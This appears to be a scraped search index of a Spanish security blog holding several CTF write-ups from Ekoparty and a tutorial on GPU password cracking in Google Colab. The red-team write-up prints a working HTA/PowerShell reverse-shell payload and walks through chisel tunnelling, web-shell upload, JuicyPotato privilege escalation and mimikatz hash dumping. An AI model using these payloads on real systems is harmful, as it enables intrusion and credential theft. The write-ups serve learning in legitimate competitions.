en Flutter y le vamos a agregar como dependencia el “gadget” de frida, de esta manera no es necesario que seamos root en el dispositivo para usar frida y realizar el hook, debido a que las aplicaciones el flutter hacen caso omiso a la configuración del proxy seteado en nuestro dispositivo vamos a tener setear a nuestra maquina con kali como puerta de enlace y redirigir todo el trafico hacia nuestro burpsuite con iptables. Happy hacking! ","date":"10-16-2020","objectID":"/bypasss-ssl-android-flutterapp/:5:0","tags":["pentesting","mobile","flutter"],"title":"Bypaseando la verificación SSL en una app de flutter en Android. Parte 1)","uri":"/bypasss-ssl-android-flutterapp/"},{"categories":["writeup","stego"],"content":"El año pasado fue mi primer eko, después de bastante tiempo, retomé mi pasión por la seguridad informática. Esa curiosidad, sobre todo por entender cómo funcionan las cosas y cómo podría utilizarse ese funcionamiento para otros fines. A diferencia del año pasado, esta eko me encontró participando de un team (BHF) y además con algunas nociones para poder encarar los CTF’s, cosa que el año anterior no hubiese imaginado. Shebi nos anotó como equipo en dos CTF’s: Pucará y Onapsis. Entramos a ver cada uno de los ch4ll3ng3s a ver por dónde empezar y qué podíamos hacer. No nos imaginábamos que íbamos a rankear en ambos, simplemente era un desafío gustoso que tomábamos como equipo. Abro paréntesis, literal (si recién comienzan en el mundo de la esteganografía, les recomiendo este artículo: https://hackinglethani.com/es/esteganografia/) Después de terminar el juego de abrir los candados de Naranja, me aboqué al CTF de Onapsis. Uno de los ch4ll3ng3 que más me gustó fue el de stego. Les invito a leer el writeup a continuación. ","date":"09-30-2020","objectID":"/stego-onapsis-writeup/:0:0","tags":["writeup","stego","ekoparty"],"title":"WriteUp CTF Stego de Onapsis - EKOPARTY","uri":"/stego-onapsis-writeup/"},{"categories":["writeup","stego"],"content":"Premisa del ch4ll3ng3 Steg FLAGSteg Flag \"\rSteg FLAG\r Como se observa en la imagen, hace referencia al uso de la clásica cortapluma Victorinox, esto da una pista de que se necesitarán varias herramientas para su resolución. El archivo descargado es “in_plain_sight.tar.xz”. Al extraerlo hay una imagen: “in_plain_sight.jpg”. Es una captura de una escena de Toy Story 2, cuando nuestros héroes cruzan la calle hacia la juguetería. Imagen de Toy Story 2Imagen \"\rImagen de Toy Story 2\r ","date":"09-30-2020","objectID":"/stego-onapsis-writeup/:1:0","tags":["writeup","stego","ekoparty"],"title":"WriteUp CTF Stego de Onapsis - EKOPARTY","uri":"/stego-onapsis-writeup/"},{"categories":["writeup","stego"],"content":"1° hallazgo (stegsolve) Lo primero que hice fue ejecutar el comando “strings” sobre el archivo, pero no obtuve nada interesante. También le pasé Binwalk, sin resultados. Algo me decía, por el título del ch4ll3ng3, que se trababa de encontrar un mensaje oculto en las capas de la imagen. Para esto utilicé la herramienta Stegsolve (https://github.com/zardus/ctf-tools/blob/master/stegsolve/install) en Kali/Linux: # java -jar stegsolve.jar Al ejecutarse, abrí la imagen y justo cuando iba pasando capa por capa, apareció memoryempty desde atrás y dijó ahí está, y tenía razón: th1s_1s_n0t_th3_fl4gth1s_1s_n0t_th3_fl4g \"\rth1s_1s_n0t_th3_fl4g\r ","date":"09-30-2020","objectID":"/stego-onapsis-writeup/:2:0","tags":["writeup","stego","ekoparty"],"title":"WriteUp CTF Stego de Onapsis - EKOPARTY","uri":"/stego-onapsis-writeup/"},{"categories":["writeup","stego"],"content":"2° hallazgo (steghide) Nos emocionamos, pero el mensaje era sincero, no se trataba del flag. Entonces, ¿para qué era? Un rabbit hole seguro que no. Ya había probado con Binwalk, que no encontró archivos ocultos, o eso pensé. Di con una herramienta que busca archivos ocultos protegidos con clave. Se trata de “Steghide” (https://pkg.kali.org/pkg/steghide ): # steghide extract -sf in_plain_sight.jpg Esto me solicitó una clave, y adivinen cuál era, ¡sí! th1s_1s_n0t_th3_fl4g! Al introducir la clave, se genera en el directorio el archivo “flag.txt”. Al leerlo nos da el siguiente mensaje: # cat flag.txt What?! Flag was right here next to me! I promise! It was super happy when Snow White and the 7 dwarfs visited Wonder what happenned... I know it's a little bit shy... Maybe it's hiding... There aren't that many places to hide, though... Maybe in plain sight? After all, it's said to be one of the best places to hide ","date":"09-30-2020","objectID":"/stego-onapsis-writeup/:3:0","tags":["writeup","stego","ekoparty"],"title":"WriteUp CTF Stego de Onapsis - EKOPARTY","uri":"/stego-onapsis-writeup/"},{"categories":["writeup","stego"],"content":"3° Th1s_1s_th3_fl4g! (stegsnow) Dice que el flag está junto al texto y no es visible. También habla de Blancanieves… recordé un taller sobre esteganografía que había visto el día anterior: Taller de CTF I: Criptografía y Esteganografía - Víctor Villar Vi la ocultación de mensajes mediante el método “whitespace”, que no es visible a la vista, pero con cualquier editor de texto en terminal es posible observar en color rojo aquellos lugares en blanco. Probé con nano y así era. Luego de cada frase había varias whitespaces. En el mismo taller, recomendaban la herramienta “Snow” para descifrar estos mensaje, y como hablaba de Blancanieves… ipso facto. Al no correr bien “Snow”, opté por “Stegsnow”: # stegsnow -C flag.txt s0_m4ny_w4yZ_0f_h1d1ng_d4t4 ¡Qué alegría! Lo pasamos a sha256, dio flag correcto :) y sumamos 150 puntos. ","date":"09-30-2020","objectID":"/stego-onapsis-writeup/:4:0","tags":["writeup","stego","ekoparty"],"title":"WriteUp CTF Stego de Onapsis - EKOPARTY","uri":"/stego-onapsis-writeup/"},{"categories":["writeup","redteam"],"content":"WOW!! La EKO ya terminó y pasó todo muy rápido! Aún queda el cansancio y cuesta conciliar el sueño pensando en todo el contenido que hubo, en las otras posibles soluciones a las que encontramos y las de los retos que no pudimos solucionar. Fueron 3 días intensos de charlas, CTF’s, café y cerveza! “Drink all the booze hack all the things!” Desde que nos enteramos que habría un CTF en el espacio RedTeam nos propusimos intentarlo, el mismo se definía según sus autores de la siguiente manera: CTF RedTeam Space\r\rEl principal objetivo del Red Team es validar las capacidades de una organización contra ciberamenazas. Tratando de emular ataques y escenarios reales para que las empresas pueden enfocar sus esfuerzos en ejemplos realistas. El objetivo del CTF de la Zona de Red Team es crear desafíos para que los profesionales, o entusiastas en el área, puedan aprender nuevas técnicas y vectores de ataque. El desafío va a estar diseñado de la siguiente manera: *La organización a atacar es Mandinga Corporation. *En esta edición los objetivos a atacar pueden ser personas o activos digitales. *Los participantes tienen que atacar a este objetivo y tiene que ir obteniendo. El formato de las flag es PUCARA{FLAG} *El último objetivo del challenge es tomar el control del Active Directory. *La idea es hacer el CTF lo más holístico posible utilizando desde técnicas de OSINT hasta post-explotacion. \r\r Los CTF’s suelen ser en su mayoría retos de ingenio en los cuales usás técnicas o ves cuestiones que no se ven en el dia a dia del trabajo del Pentester/Hacker y en algunos casos cosas que solo vas a ver en un CTF. Debemos confesar que no nos sentimos muy cómodos con los típicos retos que uno suele encontrarse en un CTF. PucaraSec supo cómo llevar a cabo un CTF equilibrado entre lo técnico y el aspecto de “rompecabezas”, que suelen tener los retos en estos tipos de eventos. ","date":"09-28-2020","objectID":"/redteam-ctf-writeup/:0:0","tags":["writeup","redteam","ekoparty"],"title":"WriteUp Redteam CTF EKOPARTY","uri":"/redteam-ctf-writeup/"},{"categories":["writeup","redteam"],"content":"Ya cómete la maldita naranja! Comencemos!Los Simpsons \"\rComencemos!\r El primer reto nos invitaba a hacer reconocimiento y que encontremos el dominio de la empresa ficticia “Mandinga Corporation” como bien se nos explicaba en los objetivos las técnicas a utilizar van desde el OSINT hasta la post-explotacion. Arrancamos con un poco de “Google Hacking” para poder realizar el primer pedido, con la siguiente búsqueda “Mandinga Corporation site:red.ctf.ekoparty.org”. Podíamos acceder a la version cacheada de la pagina del CTF en google y ver que anteriormente en el contenido del sitio estaba el dominio a atacar. En este caso, el dominio era “mandingacorp.xyz”, se trataba de un sitio en Wordpress con información institucional sobre “Mandinga Corp”, lamentablemente me olvidé de sacarle una captura de pantalla. Si bien ya teníamos el dominio, el flag para validar el reto era otro que se encontraba en una de las secciones de la página, en el código HTML. 1er FLAG1er Flag \"\r1er FLAG\r La verdad que el primer flag no fue tan fácil, en la emoción de querer hacer las cosas rápido y pasar al siguiente nivel, a veces te perdés los detalles de mirar el código HTML. Además, en un principio muchos de los que también estaban intentando realizar el CTF empezaron a darle con las herramientas automatizadas y el sitio quedó inaccesible, por suerte el equipo de PucaraSec hizo un terrible trabajo contestando cada una de las inquietudes y problemas a toda hora en el canal de Discord. ","date":"09-28-2020","objectID":"/redteam-ctf-writeup/:1:0","tags":["writeup","redteam","ekoparty"],"title":"WriteUp Redteam CTF EKOPARTY","uri":"/redteam-ctf-writeup/"},{"categories":["writeup","redteam"],"content":"2do challenge. Para el segundo flag teníamos la siguiente consigna. 2do challenge2do challenge \"\r2do challenge\r Como siempre en este tipo de eventos las pistas están en los enunciados de una manera rebuscada, lo que primero podemos ver a simple vista es que nos dice la respuesta está en los usuarios de Mandinga Corp. Navegando por la página pudimos encontrar lo siguiente: Usuarios!redteam.png \"\rUsuarios!\r Mas usuarios!redteam.png \"\rMas usuarios!\r Realizando más enumeración sobre el dominio con dnsdumpster pudimos obtener la siguiente información: dnsdumpsterdnsdumpster \"\rdnsdumpster\r Enumeramos con nmap mail.mandingacorp.xyz Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 14:50 -03 Nmap scan report for mail.mandingacorp.xyz (54.94.146.7) Host is up (0.066s latency). Not shown: 9995 filtered ports PORT STATE SERVICE VERSION 25/tcp open smtp? | smtp-commands: localhost, SIZE 20480000, AUTH LOGIN, HELP, |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 110/tcp open pop3 hMailServer pop3d |_pop3-capabilities: UIDL USER TOP 143/tcp open imap hMailServer imapd |_imap-capabilities: IDLE completed RIGHTS=texkA0001 CAPABILITY OK IMAP4rev1 SORT IMAP4 QUOTA CHILDREN NAMESPACE ACL 587/tcp open submission? | fingerprint-strings: | smtp-commands: localhost, SIZE 20480000, AUTH LOGIN, HELP, |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 3389/tcp open ms-wbt-server Microsoft Terminal Services Vemos que nos encontramos con un servidor de correo y previamente pudimos obtener nombres de usuarios. Si bien solo tenemos a “wanda.nardo@mandingacorp.xyz” y “susana.gimenes@mandingacorp.xyz” es fácil inferir que las personas en “Our Team” deben tener el correo con forma “nombre.apellido@mandingacorp.xyz” . Nos queda la siguiente lista de supuestos correos validos. marcelo.tineli@mandingacorp.xyz florencia.penia@mandingacorp.xyz hugo.mochano@mandingacorp.xyz wanda.nardo@mandingacorp.xyz susana.gimenes@mandingacorp.xyz Al enviar un correo todos los usuarios respondían y podíamos encontrarnos con mensajes graciosos como el siguiente: RespuestaRespuesta \"\rRespuesta\r Gracias a una experiencia previa en una máquina de HackTheBox, intenté enviar un correo con un enlace para ver si algunos de los usuarios accedía, el enlace iba directo a mi servidor web. Envié el enlace a todos los usuarios… me quedé mirando los logs del servidor, pero solo veía las peticiones de los bots de Shodan, Google y alguna que otra IP China intentando vulnerar mi servidor WEB. A todo esto ya estaba entrada la noche del primer díaa de la Ekoparty, varias horas de charlas, el CTF de RedTeam y el de ONAPSIS en paralelo; ¡no había estirado las piernas en 8 horas! Junto con bronxi, salimos a comprar unas cervezas y recibir un poco de oxígeno, a las 2 cuadras de nuestro trayecto al parecer mi cerebro se oxígeno y relacionó las palabras “Higo, Tartas, Almendras” con las siglas HT. Recordé que si el usuario abre un archivo .HTA mediante Internet Explorer podíamos conseguir ejecución de código. Volvimos ya con las piernas estiradas y el cerebro oxigenado a la carga, preparé el siguiente archivo HTA: \u003chtml\u003e \u003chead\u003e \u003cscript\u003e var c= \"powershell -nop -w 1 -c \\\"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u003e\u00261 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\\"\" new ActiveXObject('WScript.Shell').Run(c); \u003c/script\u003e \u003c/head\u003e\u003cbody\u003e \u003cscript\u003eself.close(); \u003c/script\u003e \u003c/body\u003e\u003c/html\u003e El payload nos da una shell inversa con powershell al host y puertos seleccionados, a la persona que esté leyendo le recomiendo el repositorio PayloadAllTheThings que contiene disintas maneras de generar s","date":"09-28-2020","objectID":"/redteam-ctf-writeup/:2:0","tags":["writeup","redteam","ekoparty"],"title":"WriteUp Redteam CTF EKOPARTY","uri":"/redteam-ctf-writeup/"},{"categories":["writeup","redteam"],"content":"3er Challenge 3er challenge3er challenge \"\r3er challenge\r Marcelo nos dio el “foothold”, ahora comienza lo divertido: el movimiento lateral y el reconocmiento de la red interna. En la página institucional había una seccion llamada “Bank” que te dirigía al enlace “https://10.0.228”, conociendo esto necesitamos alguna manera de poder ver y enumerar los distintos recursos de la red interna. Necesitamos hacer un “Túnel” entre nuestra máquina atacante hacia la que obtuvimos acceso. Esto se conoce como tunneling y hay varias maneras de realizarlo, si hubiéramos usado metasploit lo traería inegrado, aunque leí en Discord que a muchos nos les estuvo funcionando para este CTF. Como nosotros teníamos una shell en powershell, decidimos usar una herramienta llamada chisel, es un solo binario escrito en GO y tiene muchas características! Descargamos la versión de Windows de chisel en nuestro servidor web, lo descomprimos y lo descargamos en nuestra máquina objetivo usando powershell “iwr -Uri http:/ip/chisel.exe -OutFile chisel.exe”. Una vez descargado, necesitamos correrlo en nuestra máquina atacante en modo servidor con los siguientes parametros: ./chisel server -p 8000 --reverse En la máquina objetivo con los siguientes parametros: ./chisel client ip:8000 R:9001:10.0.0.228:443 Cuando el cliente se conecta, se abre el puerto 9001 en nuestra máquina y podemos mediante chisel redirigir todo el tráfico que mandemos por el puerto 9001 a la ip interna 10.0.228 puerto 443. Si quieren obtener más info de cómo usar chisel pueden ir al siguiente enlace Lamentablemente, me olvide de sacar un screenshot de la página principal, pero podíamos ver que se trataba de una aplicación web escrita en PHP y se nos presentaba un formulario para crear un usuario con su respectiva contraseña y loguearnos. Una vez logueados, se nos presenta la siguiente página: BankBank \"\rBank\r Y en la sección “profile” lo siguiente: Mas duro que gato de yesoBank profile \"\rMas duro que gato de yeso\r Si tenemos más de 2000 pe en nuestra cuenta, se permite cambiar nuestra foto de perfil, enseguida podemos inferir que si logramos subir un archivo PHP obtendremos ejecucion de código. Pero, ¿cómo? En reto se llama “Race against the machine” y se nos indica que la página de PucaraSec puede tener información sobre esto. En su blog encontramos un excelente artículo sobre los errores conocidos como “race conditions”, que no solo se encuentran en los binarios y también pueden suceder en las aplicaciones WEB. Recomendada lectura; no tiene desperdicio. Después de leer el post, tuvimos pie para abusar de un “race condition” en la página del Banco de Mandinga Corp. En el post para aprovechar la vulnerabilidad se utiliza BurpSuite. Para hacer uso del multithreading en Burpsuite tenés que tener la version paga. Lametablemnte no la tenemos, pero siempre está nuestro amigo OWASP ZAP para los pobres. Ponemos a correr OWASP ZAP, hacemos un request y lo modificamos para agregarle el Header “Count” OWASP ZAPZAP \"\rOWASP ZAP\r Luego agarramos nuestra petición modificada y la mandamos a “Fuzzer”, agregamos el “1” en nuestro header Count y configuramos para que realice 100 peticiones. ZAP FuzzingZAP Fuzzer \"\rZAP Fuzzing\r En la pestaña “options” seleccionamos que use 50 threads concurrentes y de esta manera lograr el cometido. ZAP Fuzzing 2ZAP Fuzzer \"\rZAP Fuzzing 2\r Nuevamente recomiendo leer el blog de PucaraSec para entender mejor porqué esto funciona. Voila! ¡Una vez lanzado nuestro “fuzzer” logramos nuestro cometido! Funcionara en mi banco(?Exploit Banco \"\rFuncionara en mi banco(?\r Volvemos a la seccion “Profile” y nos permite subir una imagen, nosotros aprovechamos al no haber restricciones en lo que se sube y subimos una web shell en php en este caso p0wny shell. Otra shell que felicidad!Shell banco \"\rOtra shell que felicidad!\r El flag se encuentra en el “root” del disco C:\\ ","date":"09-28-2020","objectID":"/redteam-ctf-writeup/:3:0","tags":["writeup","redteam","ekoparty"],"title":"WriteUp Redteam CTF EKOPARTY","uri":"/redteam-ctf-writeup/"},{"categories":["writeup","redteam"],"content":"4to Challenge 4 To Challenge4to Challenge \"\r4 To Challenge\r Luego de una enumeración manual vimos que existe una carpeta C:\\Nuclear_codes para la que no tenemos permisos de lectura. La cuenta es de servicio de Windows y se llama “xampp”. Necesitamos ser SYSTEM! La parte de elevación de privilegios suele ser otra parte bastante frustante, hay que prestar mucha atención al detalle, después de curtirme con varias máquinas del OSCP y HackTheBox aprendí que muchas veces la respuesta está a un simple comando o en el home del usuario del que tenemos privilegios. Corrimos el comando “whoami /priv” y nos dio como resultado que el privilegio “SeImpersonatePrivilege” está habilitado. Vamos a utilizar la herramienta Juicipotato para poder elevar nuestros privilegios. En el día viernes en el espacio RedTeam se dio un workshop sobre “Elevación de privilegios en Windows” y se mencionó al abuso de “Token Privileges” y el uso de Juicypotato. Subimos el binario de JuicyPotato a la máquina mediante la sección “Profile” de la página. Preparamos un “payload”, se trata de un archivo “bat” con una secuencia de comandos para crear un usuario Administrador, nos percatamos que esta manera era la más “simple”, si hacíamos una shell inversa y por algun motivo se caía, había que volver a comenzar el proceso con Juicypotato. Otra contra de realizar una shell inversa era que no se tenía acceso a Internet, así que habría que hacer la conexión a la primer máquina que obtuvimos una shell, como en una enumeración a los puertos del host 10.0.0.228 nos dimos cuenta que el puerto 3389 estaba abierto, nos pareció lo más simple crear una cuenta de Administrador y conectarnos por RDP, pivotendo mediante nuestro primer host controlado. Creamos el payloadPayloadpriv \"\rCreamos el payload\r Ejecutamos el scriptPrivEscSuccess \"\rEjecutamos el script\r Vemos que la cuenta “vamoss” se creo correctamente! Apartir de acá pudimos leer el flag y el contenido del archivo en Nuclear_codes con el siguiente contenido: 10.0.0.134 donaldtrump:peluquin!! PUCARA{VVEFQNMBGXELEYVHARDMUZZAGIWFCQKN} ","date":"09-28-2020","objectID":"/redteam-ctf-writeup/:4:0","tags":["writeup","redteam","ekoparty"],"title":"WriteUp Redteam CTF EKOPARTY","uri":"/redteam-ctf-writeup/"},{"categories":["writeup","redteam"],"content":"5to Challenge Ejecutamos el scriptPrivEscSuccess \"\rEjecutamos el script\r Hasta acá llegamos, solucionamos el 4to challenge en la tarde noche del viernes y no pudimos avanzar más. Nos dedicamos a enumerar los hosts que conocíamos hasta el momento, como se nos indica en el archivo con el flag del 4to challenge, se nos da una IP, esa ip pertenecia a una pc unida al dominio mandingacorp.xyz, para ser más exactos en la enumeración encontramos beta.mandingacorp.xyz(10.0.0.134), alpha.mandingacorp.xyz, gamma.mandingacorp.xyz y el controlador de dominio dc01.mandingacorp.xyz(10.0.0.195), hasta donde pudimos ver algunos hosts tenían el puerto 80 corriendo IIS, y todas SMB y RDP. Intentamos hasta con vulnerabilidades a esos hosts sin exito, eternalblue y zerologon en el DC. Lamentablemte no pudimos seguir, se ve que tadavía quedaba mucha más diversion por delante. memoryempty se dedicó a escanear la red y los hosts con nmap y proxychains mediante chisel, probamos “donaldtrump:peluquin!!” como usuario y contraseña en todo aquello que requería un login, sin exito. Dumpeamos los hashes de los los hosts controlados con mimkatz y los probamos contra los hosts conocidos y nada. Para el día sábado ya estabamos exhaustos, pero muy contentos con lo que logramos. ","date":"09-28-2020","objectID":"/redteam-ctf-writeup/:5:0","tags":["writeup","redteam","ekoparty"],"title":"WriteUp Redteam CTF EKOPARTY","uri":"/redteam-ctf-writeup/"},{"categories":["writeup","redteam"],"content":"Final Estamos muy orgullosos de haber conseguido el primer lugar en este CTF, no tenemos más que palabras de agredicimiento para la gente de PucaraSec que estuvo día y noche contestando preguntas en Discord y revisando que todo funcione correctamente. Supieron armar muy bien un CTF que resultó divertido y a la vez con cierto grado de “realismo”, en lo que a operaciones de RedTeam se referiere. También muy buen trabajo los y las organizadores y speakers del espacio RedTeam en la Ekoparty, ¡contenido de primerísima calidad! ¡Esperamos ansiosos el proximo encuentro! ","date":"09-28-2020","objectID":"/redteam-ctf-writeup/:6:0","tags":["writeup","redteam","ekoparty"],"title":"WriteUp Redteam CTF EKOPARTY","uri":"/redteam-ctf-writeup/"},{"categories":["ctf","cracking","cloud"],"content":"Bienaventurados aquellos que posean el poder adquisitivo de comprarse la bestialidad que vemos en la imagen. Para aquellos que no se hayan dado cuenta en la imagen podemos observar un “rig de cracking” que cuenta con 9 placas de video Nvidia GeForce RTX 2080, la imagen la encontré en un posteo de un usuario de Twitter ","date":"09-09-2020","objectID":"/cloud-crackin-hashcat/:0:0","tags":["cracking","cloud","ctf"],"title":"Crackeando contraseñas en la 'Nube' y GRATIS!","uri":"/cloud-crackin-hashcat/"},{"categories":["ctf","cracking","cloud"],"content":"¿Por que? Primero comencemos en por que alguien querría gastar tanto dinero en semejante equipo, aca no solo hay que contar el costo de las placas de video que cuestan de 750 a 850 USD cada una, las fuentes de alimentación para darles energía, el gabinete capaz de albergarlas a todas, una placa madre con soporte para esa cantidad de placas, CPU, RAM. Estamos hablando de unos 8 a 9 mil USD, si esto lo queremos llevar a Argentina el precio es aun mayor. Por que alguien querría realizar semejante inversión? La utilización del poder de computo que brinda una placa de video o varias funcionando en conjunto no queda solo relegado al mundo de los video juegos, ya sabemos que se usa en otros ámbitos como minar criptomonedas, inteligencia artificial y como no también en el mundo de seguridad informatica. Comencemos dejando de hablar de “placas de videos” y pasemos a uno de sus componentes el GPU, el GPU a diferencia del CPU esta diseñado con un propósito especifico, compuestos de cientos o miles de nucleos “sencillos” para procesar grandes cantidades de datos y realizar las mismas operaciones una y otra vez, mientras que el CPU es de proposito “general”, compuesto por pocos nucleos “complejos” y esta diseñado para realizar cualquier tipo de calculo. Aprovechando la capacidad de paralelismo del GPU podemos pedirle que realice cálculos específicos a una gran velocidad. Les dejo un video para que se entiendan las diferencias. Para nuestro caso y nuestros intereses podemos usar la capacidad de una o varias GPUs para hacer fuerza bruta a los hashes de contraseñas que hayamos obtenido y conocer el valor de la contraseña. ¿Que es una funcion hash? Una función criptográfica hash- usualmente conocida como “hash”- es un algoritmo matemático que transforma cualquier bloque arbitrario de datos en una nueva serie de caracteres con una longitud fija. Independientemente de la longitud de los datos de entrada, el valor hash de salida tendrá siempre la misma longitud. Kapersky Latam Blog ","date":"09-09-2020","objectID":"/cloud-crackin-hashcat/:1:0","tags":["cracking","cloud","ctf"],"title":"Crackeando contraseñas en la 'Nube' y GRATIS!","uri":"/cloud-crackin-hashcat/"},{"categories":["ctf","cracking","cloud"],"content":"¿Como? Usar capacidad de computo para romper contraseñas no es nada nuevo, pero últimamente con las mejores capacidades de los CPUs y por sobre todo GPUs las contraseñas poco complejas son vulneradas en cuestión de segundos. Herramientas para hacer fuerza bruta hay muchas, quizás la mas conocida y mas utilizada de todas es “John the ripper”, hoy en dia tenemos mejores herramientas sobre todo para aprovechar la capacidad de paralelismo del GPU, en este caso vamos a estar utilizando y hablando de hashcat. Hashcat a diferencia de otras herramientas puede hacer uso del GPU para realizar fuerza bruta. Soporta cientos de funciones hash y las cientos de variantes que se conocen, provee la capacidad de usar un diccionario predefinido, o armar mutaciones de conjuntos de caracteres, esta entrada no va a ser extensiva con el uso de la herramienta y recomiendo dirigirse a su sitio para conocer mejor sus funcionalidades. ","date":"09-09-2020","objectID":"/cloud-crackin-hashcat/:2:0","tags":["cracking","cloud","ctf"],"title":"Crackeando contraseñas en la 'Nube' y GRATIS!","uri":"/cloud-crackin-hashcat/"},{"categories":["ctf","cracking","cloud"],"content":"PERO COMO!!??? Ya sabemos que de este lado del mundo poder acceder a esa capacidad de computo esta muy lejos de nuestros bolsillos, incluso solo comprarse una placa de video puede ser bastante costoso. MoneyMoney! \"\rMoney\r Nnuca esta de mas contar con la capacidad de romper hashes, ya sea por conocer esa contraseña de esa red de Fibertel, mientras hacemos un CTF o realizamos un pentest, pero como dijimos lo mas probable es que solo contemos con aquella vieja Nvidia 9800 o simplemente con nuestra notebook y su i3 corriendo con 4 maquinas virtuales al mismo tiempo. ","date":"09-09-2020","objectID":"/cloud-crackin-hashcat/:3:0","tags":["cracking","cloud","ctf"],"title":"Crackeando contraseñas en la 'Nube' y GRATIS!","uri":"/cloud-crackin-hashcat/"},{"categories":["ctf","cracking","cloud"],"content":"Google Colab Viendo videos de John Hammond llegue a “Google Colaboratory” la herramienta de Google para ejecutar codigo de Python con el acceso a GPUs, Y GRATIS!, esto esta hecho para que estudiantes, cientificos de datos e investigadores en inteligencia artificial tengan acceso al uso de GPUs para sus calculos. Si bien esta pensando para ejecutar codigo de python directamente también podemos ejecutar comandos en la instancia que se nos provee e instalar software. Lo que vamos a hacer es lo siguiente: Instalar y configurar un servidor ssh Instalar y configurar ngrok para realizar un tunel tcp al puerto 22 y conectarnos por ssh Compilar e instalar hashcat Profit! Podemos acceder a Colab con nuestra cuenta de google, vamos a utilizar el siguiente enlace que ya trae todo los pasos anteriormente descritos. ColabColab \"\rColab\r Mediante ese enlace se va a acceder a Colab, se va a tomar el archivo SSH-hashcat.ipynb de mi repo de Github y se va cargar, antes de comenzar vamos a necesitar 2 cosas una cuenta en ngrok y generar una “ssh key” para conectarnos a nuestra instancia por ssh. Para generar una “ssh key” podemos en Linux ejecutar el comando “ssh-keygen” de la siguiente forma: ssh-keygen -f colab ssh-keygenSsh-keygen \"\rssh-keygen\r Esto nos va a crear la clave publica y privada en esta parte vamos a necesitar la clave publica que la podemos ver la de siguiente manera: cat colab.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcEQehlls3I58AvJB4H0Dhqvkt7OCfEFRXEH0dYIaUGqc5Ox+EM1CaywEEhbWSxbdwnaSuaVvPx9DYEMiRdDfqA0ER4y3YcvRQhsMQj/6FrBg7LZrMDrt6/MJ82F9dia8p0KkWtEqsAdbTFK1nY9ICayi/MHy4nH+KX+2hFo0egcuP1nUOD3TsaF1u1lCWiOvqtaieGQpPPoupaUIYip1EdQRcN/0IPmEBaN9oInypim1E2qX6pWe6DQwUaT0sSu3jlyGuGOxq6MxlfPhvI7nDjs6CT7eaLFFYUTuSH7fnfS5zP9E+kVae0TJ16/qo5igm5ARPhnlb6db3hZ64qmup root@8ae1bd63e6e1 Procedemos a ejectuar cada una de las instrucciones del archivo .ipynb en secuencia Esto nos va a instalar ngrok y el servidor ssh ! wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip \u003e /dev/null ! unzip ngrok-stable-linux-amd64.zip \u003e /dev/null ! apt-get install openssh-server Esto nos va a configurar y dejar corriendo ngrok, en esta parte nos va a pedir que ingresemos el token de ngrok el cual se consiguie accediendo a https://dashboard.ngrok.com/authuna vez tenemos una cuenta print(\"Copy authtoken from https://dashboard.ngrok.com/auth\") import getpass authtoken = getpass.getpass() get_ipython().system_raw('./ngrok authtoken $authtoken \u0026\u0026 ./ngrok tcp 22 \u0026') Configura el servidor ssh y lo deja corriendo, en esta parte se nos va a pedir la clave publica previamente generada. ! echo \"PubkeyAuthentication yes\" \u003e\u003e /etc/ssh/sshd_config ! echo \"PermitRootLogin prohibit-password\" \u003e\u003e /etc/ssh/sshd_config ! echo \"AuthorizedKeysFile .ssh/authorized_keys\" \u003e\u003e /etc/ssh/sshd_config ! echo \"LD_LIBRARY_PATH=/usr/lib64-nvidia\" \u003e\u003e /root/.bashrc ! echo \"export LD_LIBRARY_PATH\" \u003e\u003e /root/.bashrc ! mkdir -p /var/run/sshd ! mkdir -p /root/.ssh ! touch /root/.ssh/authorized_keys ! ls -lah /root/.ssh import getpass print(\"Paste your SSH public key: \") publickey = getpass.getpass() get_ipython().system_raw('echo $publickey \u003e\u003e /root/.ssh/authorized_keys') get_ipython().system_raw('/usr/sbin/sshd -D \u0026') Instala hashcat !apt install cmake build-essential -y !apt install checkinstall git -y !git clone https://github.com/hashcat/hashcat.git !cd hashcat \u0026\u0026 git submodule update --init \u0026\u0026 make \u0026\u0026 make install Nos muestra con que puerto y nombre de dominio podemos acceder al servicio ssh. ! curl -s http://localhost:4040/api/tunnels | python3 -c \"import sys, json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])\" Al ejecutar este ultimo paso vamos a obtener el nombre de dominio y el puerto por el cual nos podemos conectar a nuestra instancia por SSH. Exito!Exito \"\rExito!\r Nos conectamos en nuestra maquina con Linux utilizando el comando ssh, especificando nuestra clave privada con el flag -i y con el flag -p el puerto. Ej: ssh -i colab -p 10448 root@0.tcp.ngrok.io A cont","date":"09-09-2020","objectID":"/cloud-crackin-hashcat/:4:0","tags":["cracking","cloud","ctf"],"title":"Crackeando contraseñas en la 'Nube' y GRATIS!","uri":"/cloud-crackin-hashcat/"},{"categories":["ctf","cracking","cloud"],"content":"Conclusion Luego de estos pasos podemos utilizar Colab, y hashcat para seguramente por lejos obtener mejor rendimiento que en nuestro Kali virtualizado con un solo core asignado. Si bien mostre como conectarme por ssh a la instancia que nos provee google, los comandos tambien pueden ser ejecutados directamente desde la interfaz de Colab. Ejecucion comandosEjecucion comandos \"\rEjecucion comandos\r Por ultimo les dejo los 2 repositorios de los cuales hice el archivo que comparti en mi repo, sacando ideas de los 2 y que se ajuste a mis necesidades- https://github.com/someshkar/colabcat https://github.com/semihucann/hash_cracking_with_gpu Happy Cracking! ","date":"09-09-2020","objectID":"/cloud-crackin-hashcat/:5:0","tags":["cracking","cloud","ctf"],"title":"Crackeando contraseñas en la 'Nube' y GRATIS!","uri":"/cloud-crackin-hashcat/"},{"categories":["forensics","ctf"],"content":"El 29 de Agosto se realizó la NotPinkCon, excelente conferencia de ciberseguridad impartida por mujeres cuyo objetivo principal es incentivar a las mujeres a que participen como oradoras y cada vez sean más las que asisten a eventos de seguridad informática. La jornada del 29 fue excepcional, charlas de un muy buen nivel técnico, con charlas en inglés y castellano, traducción 